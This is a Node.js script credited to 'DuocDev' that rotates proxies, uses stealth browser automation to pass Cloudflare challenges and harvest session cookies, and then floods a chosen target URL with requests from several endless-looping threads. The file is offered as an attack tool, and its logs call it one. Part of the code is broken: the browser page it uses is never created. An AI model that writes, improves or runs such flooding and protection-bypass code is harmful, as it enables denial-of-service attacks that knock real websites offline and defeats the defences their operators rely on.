/**
 * ==================================================
 *  🚀 Script by DuocDev
 *  🔒 All Rights Reserved – Private Use Only
 *  ❌ Redistribution or commercial use is prohibited
 * ==================================================
 */
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
const axios = require('axios');
const fs = require('fs');
const { spawn } = require('child_process');
const colors = require('colors');
console.clear();
console.log("===========================================".green);
console.log("   🚀 Script by DuocDev – All Rights Reserved".cyan);
console.log("   🔒 Private Use Only | ❌ No Redistribution".yellow);
console.log("===========================================\n".green);

// ========== CONFIGURATION ========== //
const TARGET_URL = process.argv[2] || "https://example.com";
const THREADS = parseInt(process.argv[3]) || 5;
const PROXY_FILE = process.argv[4] || "proxy.txt";
const REQUEST_RATE = parseInt(process.argv[5]) || 30;
const DURATION = parseInt(process.argv[6]) || 300; // in seconds
const FLOOD_MODE = process.argv[7] === "true";

// Load proxies
const proxies = fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(Boolean);

// ========== ENHANCED CLOUDFLARE BYPASS ========== //
puppeteer.use(StealthPlugin());
puppeteer.use(AdblockerPlugin({ blockTrackers: true }));

// ========== PROXY ROTATION & VALIDATION ========== //
async function getWorkingProxy() {
  for (const proxy of proxies) {
    try {
      const [ip, port, username, password] = proxy.split(':');
      const test = await axios.get('https://www.cloudflare.com/cdn-cgi/trace', {
        proxy: { host: ip, port: parseInt(port) },
        timeout: 5000
      });
      if (test.data.includes('uag=Mozilla')) return proxy;
    } catch (e) { /* Proxy dead, skip */ }
  }
  throw new Error("No working proxies available");
}

// ========== CLOUDFLARE CHALLENGE DETECTION ========== //
async function detectChallenge(page) {
  const challengeTypes = {
    "Cloudflare 5s": 'iframe[src*="challenge.cloudflare.com"]',
    "Turnstile CAPTCHA": '.cf-turnstile',
    "hCaptcha": '.hcaptcha-box',
    "JS Challenge": '#cf-challenge-running'
  };

  for (const [type, selector] of Object.entries(challengeTypes)) {
    if (await page.$(selector)) {
      console.log(`[!] Detected ${type} Challenge`);
      return type;
    }
  }
  return null;
}

// ========== AUTOMATED CHALLENGE SOLVING ========== //
async function solveChallenge(page, challengeType) {
  switch (challengeType) {
    case "Cloudflare 5s":
      await solve5sChallenge(page);
      break;
    case "Turnstile CAPTCHA":
      await solveTurnstile(page);
      break;
    case "hCaptcha":
      await solveHcaptcha(page);
      break;
    case "JS Challenge":
      await solveJsChallenge(page);
      break;
    default:
      await genericBypass(page);
  }
}

// ========== CLOUDFLARE 5s BYPASS ========== //
async function solve5sChallenge(page) {
  await page.waitForTimeout(3000); // Wait for challenge to load
  await page.evaluate(() => {
    document.querySelector('input[type="checkbox"]').click(); // Click verify
  });
  await page.waitForNavigation({ timeout: 10000 });
}

// ========== TURNSTILE CAPTCHA BYPASS ========== //
async function solveTurnstile(page) {
  await page.waitForSelector('.cf-turnstile iframe');
  const frame = page.frames().find(f => f.url().includes('challenges.cloudflare.com'));
  if (!frame) throw new Error("Turnstile frame not found");
  
  // Simulate human interaction
  await frame.hover('input[type="checkbox"]');
  await page.waitForTimeout(1000 + Math.random() * 2000);
  await frame.click('input[type="checkbox"]');
  await page.waitForNavigation({ timeout: 15000 });
}

// ========== JS CHALLENGE SOLVER ========== //
async function solveJsChallenge(page) {
  const answer = await page.evaluate(() => {
    const script = Array.from(document.scripts).find(s => 
      s.textContent.includes('setTimeout(function(){')
    );
    if (!script) return null;
    
    // Extract challenge calculation
    const equationMatch = script.textContent.match(/var (\w+)=([^;]+);/);
    if (!equationMatch) return null;
    
    // Solve the equation (simplified)
    const [, varName, equation] = equationMatch;
    const solution = eval(equation.replace(/[^\d+\-*\/()]/g, ''));
    return solution;
  });

  if (!answer) throw new Error("Failed to solve JS challenge");
  
  // Submit the answer
  await page.evaluate((ans) => {
    document.querySelector('input[name="jschl_answer"]').value = ans;
    document.querySelector('form').submit();
  }, answer);
  
  await page.waitForNavigation({ timeout: 15000 });
}

// ========== MAIN BROWSER LAUNCHER ========== //
async function launchBrowser(proxy) {
  const [ip, port] = proxy.split(':');
  const browser = await puppeteer.launch({
    headless: true,
    args: [
      `--proxy-server=http://${ip}:${port}`,
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-accelerated-2d-canvas',
      '--disable-gpu',
      '--disable-web-security'
    ]
  });

  /*const page = await browser.newPage();
  await page.authenticate({ username, password });*/
  
  // Apply stealth settings
  await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
  await page.setViewport({ width: 1366, height: 768, deviceScaleFactor: 1 });

  // Navigate to target URL
  await page.goto(TARGET_URL, { waitUntil: 'networkidle2', timeout: 30000 });

  // Check for challenges
  const challengeType = await detectChallenge(page);
  if (challengeType) await solveChallenge(page, challengeType);

  // Extract cookies & session data
  const cookies = await page.cookies();
  const sessionData = {
    cookies: cookies.map(c => `${c.name}=${c.value}`).join('; '),
    userAgent: await page.evaluate(() => navigator.userAgent),
    proxy
  };

  await browser.close();
  return sessionData;
}

// ========== FLOOD MODE (DDoS Simulation) ========== //
async function floodAttack(session) {
  const { cookies, userAgent, proxy } = session;
  for (let i = 0; i < REQUEST_RATE; i++) {
    axios.get(TARGET_URL, {
      headers: {
        'User-Agent': userAgent,
        'Cookie': cookies,
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': TARGET_URL
      },
      proxy: { host: proxy.split(':')[0], port: parseInt(proxy.split(':')[1]) },
      timeout: 5000
    }).catch(() => {});
  }
}

// ========== MAIN EXECUTION ========== //
(async () => {
  console.log(colors.green(`[+] Starting Cloudflare Bypass Attack on ${TARGET_URL}`));
  
  // Multi-threading
  for (let i = 0; i < THREADS; i++) {
    (async () => {
      while (true) {
        try {
          const proxy = await getWorkingProxy();
          const session = await launchBrowser(proxy);
          
          if (FLOOD_MODE) {
            await floodAttack(session);
            console.log(colors.yellow(`[!] Flooding ${TARGET_URL} via ${proxy}`));
          } else {
            console.log(colors.blue(`[✓] Bypassed Cloudflare via ${proxy}`));
          }
        } catch (e) {
          console.log(colors.red(`[X] Error: ${e.message}`));
        }
      }
    })();
  }

  // Auto-stop after duration
  setTimeout(() => {
    console.log(colors.green(`[✓] Attack completed after ${DURATION} seconds.`));
    process.exit(0);
  }, DURATION * 1000);
})();
